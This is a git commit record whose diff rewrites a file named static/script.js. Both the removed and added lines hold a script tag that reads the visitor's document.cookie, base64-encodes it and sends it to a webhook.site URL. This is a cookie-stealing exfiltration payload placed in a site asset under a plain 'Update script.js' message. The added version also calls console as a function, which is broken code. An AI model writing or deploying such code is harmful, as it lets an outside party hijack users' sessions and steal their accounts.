bdc5effd656de29d829ce8f58343b773f887025c
Andyyds404 <andyxc3292@gmail.com>
2025-04-13 00:52:22 +0800

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,1 +1,4 @@
-<script>fetch("webhook.site/8aee7171-ccf8-4c6d-9dbf-ccd168f84806?"+window.btoa(document.cookie))</script>
+<script>
+  fetch("webhook.site/8aee7171-ccf8-4c6d-9dbf-ccd168f84806?"+window.btoa(document.cookie));
+  console("success");
+</script>
